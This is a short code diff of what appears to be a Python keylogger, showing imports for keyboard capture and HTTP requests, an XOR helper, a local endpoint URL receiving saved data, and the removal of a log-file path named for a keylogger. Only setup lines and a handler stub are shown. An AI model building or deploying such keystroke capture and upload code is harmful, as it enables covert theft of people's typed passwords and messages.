@@ -2,15 +2,7 @@ import keyboard, requests, threading, time                       #Import a libra
 from datetime import datetime            #Import a library that records date and time.
 from Xor_2 import xor_on_key
 
-
 my_json = []
-
-dicti = {}                                          #A dictionary for saving input from the keyboard.
-//my_json = {}
-str_for_show = ''
-
-filename = r"C:\my_python\+\file_for_kelogger.txt"
-
 url = f"http://127.0.0.1:5000/save_data"
 times = []
 
@@ -39,7 +31,6 @@ def replace_char(char):
     if char == "decimal":
         char = "."
     return char
-
 
 def on_key_press(key):
 
